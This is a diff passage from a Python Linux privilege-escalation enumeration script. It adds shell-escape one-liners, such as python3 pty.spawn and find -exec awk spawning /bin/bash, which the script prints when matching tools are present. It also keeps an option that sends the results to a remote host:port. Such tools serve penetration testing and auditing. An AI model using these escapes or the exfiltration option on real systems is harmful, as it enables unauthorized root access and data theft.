+         b'python3': [b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"],
+         b'find': [b"find / -exec awk 'BEGIN {system(\"/bin/bash\")}' \\;"]}
     for cmd in escapeCmd:
-        for result in exploitTools["TOOLS"]["results"]:
+        for result in exploitTools['TOOLS']['results'].splitlines():
             if cmd in result:
                 for item in escapeCmd[cmd]:
-                    printColour("\n    " + cmd + "-->\t" + item, outputs)
+                    printColour(cmd + b' -->\t' + item + b'\n', outputs)
 
     if args.outputfile:
         outfile.close()
@@ -407,11 +485,44 @@ def main(args):
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
-    parser.add_argument('-c', '--color', dest='color', default=False, required=False, action='store_true', help='Make the output colorized (default is off)')
-    parser.add_argument('-o', '--outputfile', dest='outputfile', required=False, help='Save the output to a file')
-    parser.add_argument('-s', '--sendhttp', dest='sendhttp', default=False, required=False, help='Sends the output to host:port')
-    parser.add_argument('-q', '--quiet', dest='quiet', default=False, required=False, action='store_true', help="Don't output results to the terminal")
-    parser.add_argument('-f', '--fullreport', dest='fullreport', default=False, required=False, action='store_true', help='Get contents of interesting files, like cron jobs')
+    parser.add_argument('-c',
+                        '--color',
+                        dest='color',
+                        default=False,
+                        required=False,
+                        action='store_true',
+                        help='Colorize the output (default is False)')
+    parser.add_argument('-o',
+                        '--outputfile',
+                        dest='outputfile',
+                        metavar='filename',
+                        required=False,
+                        help='Save the output to the specified filename')
+    parser.add_argument('-s',
+                        '--sendhttp',
+                        dest='sendhttp',
+                        metavar='127.0.0.1:8080',
+                        default=False,
+                        required=False,
+                        help='Sends the output to host:port')
+    parser.add_argument('-q',
+                        '--quiet',
+                        dest='quiet',
+                        default=False,
+                        required=False,
+                        action='store_true',
+                        help="Don't output results to the screen")
+    parser.add_argument('-d',
+                        '--deep-scan',
+                        dest='deep',
+                        default=True,
+                        metavar='(True|False)',
+                        type=bool,
+                        required=False,
+                        help=('Scan the filesystem for interesting files. This'
+                              ' is on by default, but it can make scans take a'
+                              ' while to execute and it produces a large load'
+                              ' on the filesystem.'))
     args = parser.parse_args()
 
     main(args)
